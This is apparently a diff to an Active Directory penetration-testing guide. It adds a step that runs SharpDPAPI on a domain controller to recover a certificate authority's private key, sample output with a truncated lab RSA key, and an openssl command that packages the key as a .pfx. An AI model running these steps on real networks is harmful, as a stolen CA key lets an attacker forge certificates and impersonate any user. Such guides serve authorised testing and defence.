@@ -672,11 +672,42 @@ With `SharpDPAPI` we can extract the private keys.
 
 * [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
 
+Run the following command on a **Domain Controller**:
+
 ```powershell
 .\SharpDPAPI.exe certificates /machine
 ```
 
-The private CA key has the Issuer and Subject, both the distinguished name of the CA. Save the private key into a `.pem` file and then convert it to `.pfx` with opeenssl.
+The private CA key has the Issuer and Subject, both the distinguished name of the CA.
+
+```
+  File               : b2ddcffdd2d1598108758953e4e0356b_d0c48e6a-1237-4eca-bb8c-9b22df87997d
+
+    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+    Master Key GUID  : {c153dc41-b91b-4ca3-8196-0cf72bdbf7c0}
+    Description      : Private Key
+    algCrypt         : CALG_AES_256 (keyLen 256)
+    algHash          : CALG_SHA_512 (32782)
+    Salt             : 5ea093f4e1b8c9415d080cecc3acd145b63fc9420074d51ff7998a361fd5ec24
+    HMAC             : a2d1fee192cd5ab1e4304e87d8d31267d83a98290c9e08db513bcd7214b8f09b
+    Unique Name      : sub-ca
+
+    Thumbprint       : 697B1C2CD65B2ADC80C3D0CE83A6FB889B0CA08E
+    Issuer           : CN=ca, DC=corp, DC=local
+    Subject          : CN=sub-ca, DC=dev, DC=corp, DC=local
+    Valid Date       : 8/15/2022 4:06:13 PM
+    Expiry Date      : 8/15/2024 4:16:13 PM
+
+    [*] Private key file b2ddcffdd2d1598108758953e4e0356b_d0c48e6a-1237-4eca-bb8c-9b22df87997d was recovered:
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAy1qdXLFZUIIEnDQ4g2Lh3fmppE6h0+Lql/tRlUZH41qazAeI
+mezAMzphbzZxQeJP4MBSyqi21mhFt6sC48E5A0zlUbQduADsdQU7Ty6Zr9FzYva2
+MP/zhgnmMSUEKoEA5p9bk6WcSdxixJMfmeSdFQiTDZ
+
+```
+
+Save the private key into a `.pem` file and then convert it to `.pfx` with opeenssl.
 
 ```
 $ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
